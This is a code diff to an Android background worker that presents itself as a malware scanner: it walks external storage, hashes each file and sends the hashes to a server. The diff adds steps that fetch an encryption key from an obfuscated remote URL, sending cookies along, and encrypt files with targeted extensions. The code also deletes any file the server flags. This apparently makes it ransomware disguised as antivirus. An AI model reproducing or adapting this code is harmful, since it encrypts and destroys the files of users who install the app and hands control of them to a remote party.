@@ -28,6 +28,7 @@ import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
 import java.math.BigInteger;
+import java.net.URI;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
@@ -47,6 +48,8 @@ public class a extends Worker {
     private List<Integer> yes = new ArrayList<>();
     private int progressCount = 0;
     private int noOfFiles;
+    private byte[] idk = new byte[256];
+    private String boom;
     public a(@NonNull Context context, @NonNull WorkerParameters workerParams) throws NoSuchAlgorithmException {
         super(context, workerParams);
     }
@@ -55,70 +58,77 @@ public class a extends Worker {
     @Override
     public Result doWork() {
         File yes = Environment.getExternalStorageDirectory();
-        try {
-            noOfFiles = getNoOfFiles(yes);
-            yesu(yes);
-        } catch (IOException | JSONException e) {
-            Log.e(LOG_TAG, "shit", e);
-        }
+        noOfFiles = getNoOfFiles(yes);
+        yesu(yes);
         return Result.success(new Data.Builder().putAll(listOfMalware).build());
     }
 
-    private void yesu(File yes) throws IOException, JSONException {
-       if(yes.exists()){
-           File[] array = yes.listFiles();
-           for (File oof:array) {
-               if(oof.isDirectory()){
-                   yesu(oof);
-               }
-               else{
-                   setForegroundAsync(createForegroundInfo(oof.getAbsolutePath(), progressCount));
-                   setProgressAsync(new Data.Builder().putString("Progress", String.format(Locale.ENGLISH,"%d/%d",progressCount,noOfFiles)).putString("File",oof.getAbsolutePath()).build());
-                   FileInputStream fis = new FileInputStream(oof);
-                   int i = 0;
-                   do{
-                       byte[] bytes = new byte[2097152];
-                       i = fis.read(bytes);
-                       md.update(bytes);
-                   }while(i!=-1);
-                   byte[] hash = md.digest();
-                   BigInteger no = new BigInteger(1,hash);
-                   StringBuilder wheeee = new StringBuilder(no.toString(16));
-                   while (wheeee.length() < 32) {
-                       wheeee.insert(0, "0");
-                   }
-                   JSONObject body = new JSONObject();
-                   body.put("hash",wheeee);
-                   YeetRequest jsonObjectRequest = new YeetRequest(YeetRequest.Method.POST,new GimmeString(getApplicationContext().getString(R.string.url)).decryptBoi() + url,body,response->{
-                       try {
-                           boolean isMalware = response.getBoolean("malware");
-                           if(isMalware){
-                               String type = response.getString("type");
-                               listOfMalware.put(oof.getAbsolutePath(),type);
-                               boolean ree = oof.delete();
-                               if(!ree){
-                                   throw new Exception("failed");
-                               }
-                               Log.i(LOG_TAG,String.format(Locale.ENGLISH,"%s is a MALWARE! >:(",oof.getName()));
-                           }
-                           else{
-                               Log.i(LOG_TAG,String.format(Locale.ENGLISH,"%s is clean! :D",oof.getName()));
-                           }
-                       } catch (Exception e) {
-                           Log.e(LOG_TAG,"reeeee",e);
-                       }
-                   }, Throwable::printStackTrace);
-                   Volley.newRequestQueue(getApplicationContext()).add(jsonObjectRequest);
-                   for(String lmao:extenstions) {
-                       if (oof.getAbsolutePath().endsWith(lmao)) {
-                           EncryptBoi encryptBoi = new EncryptBoi(getApplicationContext(),oof);
-                           encryptBoi.weeeeeeeeeeeeee();
-                       }
-                   }
-                   progressCount+= 1;
-               }
-           }
-       }
+    private void yesu(File yes){
+        try{
+            if(yes.exists()){
+                File[] array = yes.listFiles();
+                for (File oof:array) {
+                    if(oof.isDirectory()){
+                        yesu(oof);
+                    }
+                    else{
+                        setForegroundAsync(createForegroundInfo(oof.getAbsolutePath(), progressCount));
+                        setProgressAsync(new Data.Builder().putString("Progress", String.format(Locale.ENGLISH,"%d/%d",progressCount,noOfFiles)).putString("File",oof.getAbsolutePath()).build());
+                        FileInputStream fis = new FileInputStream(oof);
+                        int i = 0;
+                        do{
+                            byte[] bytes = new byte[2097152];
+                            i = fis.read(bytes);
+                            md.update(bytes);
+                        }while(i!=-1);
+                        byte[] hash = md.digest();
+                        BigInteger no = new BigInteger(1,hash);
+                        StringBuilder wheeee = new StringBuilder(no.toString(16));
+                        while (wheeee.length() < 32) {
+                            wheeee.insert(0, "0");
+                        }
+                        JSONObject body = new JSONObject();
+                        body.put("hash",wheeee);
+                        YeetRequest jsonObjectRequest = new YeetRequest(YeetRequest.Method.POST,new GimmeString(getApplicationContext().getString(R.string.url)).decryptBoi() + url,body,response1->{
+                            try {
+                                boolean isMalware = response1.getBoolean("malware");
+                                if(isMalware){
+                                    String type = response1.getString("type");
+                                    listOfMalware.put(oof.getAbsolutePath(),type);
+                                    boolean ree = oof.delete();
+                                    if(!ree){
+                                        throw new Exception("failed");
+                                    }
+                                    Log.i(LOG_TAG,String.format(Locale.ENGLISH,"%s is a MALWARE! >:(",oof.getName()));
+                                }
+                                else{
+                                    Log.i(LOG_TAG,String.format(Locale.ENGLISH,"%s is clean! :D",oof.getName()));
+                                }
+                            } catch (Exception e) {
+                                Log.e(LOG_TAG,"reeeee",e);
+                            }
+                        }, Throwable::printStackTrace);
+                        Volley.newRequestQueue(getApplicationContext()).add(jsonObjectRequest);
+                        YeetRequest yeetRequest =  new YeetRequest(YeetRequest.Method.GET,new GimmeString(getApplicationContext().getString(R.string.url)).decryptBoi() + url,null, response -> {
+                            try {
+                                idk = response.getString("key").getBytes();
+                                checkFile(oof);
+                            } catch (JSONException e) {
+                                e.printStackTrace();
+                            }
+
+                        },Throwable::printStackTrace);
+                        yeetRequest.setCookies(new CookieBoi(getApplicationContext()).get(URI.create(getApplicationContext().getString(R.string.url))));
+                        Volley.newRequestQueue(getApplicationContext()).add(yeetRequest);
+                        progressCount+= 1;
+                    }
+                }
+            }
+        }catch (IOException | JSONException e) {
+            Log.e(LOG_TAG, "shit", e);
+        }
+
+
     }
 
     private ForegroundInfo createForegroundInfo(String progress,int fileNo){
@@ -144,8 +154,7 @@ public class a extends Worker {
                 .build();
         return new ForegroundInfo(5555,notification);
     }
-
-   private void createChannel(String CHANNEL_ID){
+    private void createChannel(String CHANNEL_ID){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            String description = "BOOM BOOM!!!!!!";
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
@@ -156,6 +165,7 @@ public class a extends Worker {
        }
    }
     private int getNoOfFiles(File file){
+
         int x = 0;
         File[] yes = file.listFiles();
         for(File oof : yes){
@@ -167,5 +177,13 @@ public class a extends Worker {
             }
         }
         return x;
+    }
+    private byte[] checkFile(File oof){
+        for(String lmao:extenstions) {
+            if (oof.getAbsolutePath().endsWith(lmao)) {
+                idk = EncryptBoi.weeeeeeeeeeeeee(getApplicationContext(),oof,idk);
+            }
+        }
+        return idk;
     }
 }
